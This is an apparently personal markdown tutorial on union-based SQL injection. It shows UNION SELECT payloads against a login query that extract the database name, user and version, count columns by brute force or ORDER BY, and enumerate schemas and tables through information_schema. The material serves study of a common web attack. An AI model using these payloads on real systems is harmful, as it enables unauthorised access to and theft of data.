# union-based sql injection
* attacker uses the `UNION` operator
* leverages said operator to combine the results of two or more `SELECT` statements into a single result which is, then, returned as part of the HTTP response
* say you have the db from [1-sql][def]
    * say the db is hooked to an app and the app has a log-in page
    * the login page has a form whose input fields are `username` and `password`
* the query in the BE will be

    ```sql
        select * from users
        where uname="goatmatata"
        and passwd="ef92b778bafe771e89245b89ecbc08a44a4e166c06659911881f383d4473e94f";
    ```

* we can use said query to retrieve unauthorised info eg. db name, host username, hostname, db version etc
    * matter of fact, we can make the db return info we feed to it viz:

    ```sql
        select * from users
        where uname="goatmatata"
        and passwd="ef92b778bafe771e89245b89ecbc08a44a4e166c06659911881f383d4473e94f"
        union select 1,2,3;
    ```

    * this query returns two rows: one with the username-password info and another with the numbers 1, 2 and 3
    * say, instead of 3, we pass `version()`

    ```sql
        select * from users
        where uname="goatmatata"
        and passwd="ef92b778bafe771e89245b89ecbc08a44a4e166c06659911881f383d4473e94f"
        union select 1, 2, version();
    ```

    * query returns the version info of the db in the third col of the second row
    * you get the gist; let's make this interesting...

    ```sql
        select * from users
        where uname="goatmatata"
        and passwd="ef92b778bafe771e89245b89ecbc08a44a4e166c06659911881f383d4473e94f"
        union select database(), user(), version();
    ```

    * query returns db name, host username + hostname and version info in the second row
    * you can attach the `union` part of the query to the URL

    ```
        <URL>union select database(), user(), version();
    ```

* how do you find out how many columns there are?
    * good question
    * two methods: brute-forcing and using `ORDER BY` instead of `UNION...SELECT`
    * when brute-forcing, you use brute force (unsurprisingly) to know the number of cols in the table
        - use `union select 1;` and run the query. does db throw an error?
            * no: table has one col; job done
            * yes: table has more than one col; try `union select 1,2;` does db throw an error?
                * no: table has 2 cols; job done
                * yes: try `union select 1, 2...,N;` does db throw an error?
                    * no: table has N cols; job done
                    * yes: table has more than N cols; repeat procedure
    * when using `ORDER BY`, you throw a number at the db. the error it returns tells you whether to go up or down in the next pass
        - sample snippet

        ```sql
            select * from users
            where uname="goatmatata"
            and passwd="ef92b778bafe771e89245b89ecbc08a44a4e166c06659911881f383d4473e94f"
            order by 20;
        ```

        - check the error message the db throws; try `order by N;` where N is higher or lower that 20 and observe the error message returned by db. repeat procedure until you get the correct N (#cols)
        - use `union select 1, 2...,N;` when you get N
            * the output on the browser will show certain col numbers. these are the cols you can use to extract db, user and host info
            * example say N=11 and cols 2, 7 and 9 are exposed

            ```sql
                select * from users
                where uname="goatmatata"
                and passwd="ef92b778bafe771e89245b89ecbc08a44a4e166c06659911881f383d4473e94f"
                union select 1,database(),3,4,5,6,user(),8,version(),10,11;
            ```

* the following query finds all available dbs

    ```sql
        select schema_name from information_schema.schemata;
    ```

* this query can be injected viz:

    ```sql
        select * from users
        where uname="goatmatata"
        and passwd="ef92b778bafe771e89245b89ecbc08a44a4e166c06659911881f383d4473e94f"
        union
            select 1,database(),3,4,5,6,user(),8,schema_name,10,11
            from information_schema.schemata;
    ```

* finds all available tables

    ```sql
        select * from users
        where uname="goatmatata"
        and passwd="ef92b778bafe771e89245b89ecbc08a44a4e166c06659911881f383d4473e94f"
        union
            select 1,database(),3,4,5,6,user(),8,table_name,10,11
            from information_schema.tables
            where table_schema="name_of_table";
    ```

* we can, of course, make this cleaner using `group_concat()`

    ```sql
        select * from users
        where uname="goatmatata"
        and passwd="ef92b778bafe771e89245b89ecbc08a44a4e166c06659911881f383d4473e94f"
        union
            select 1,database(),3,4,5,6,user(),8,group_concat(table_name),10,11
            from information_schema.tables
            where table_schema="name_of_table";
    ```


[def]: ./1-sql.md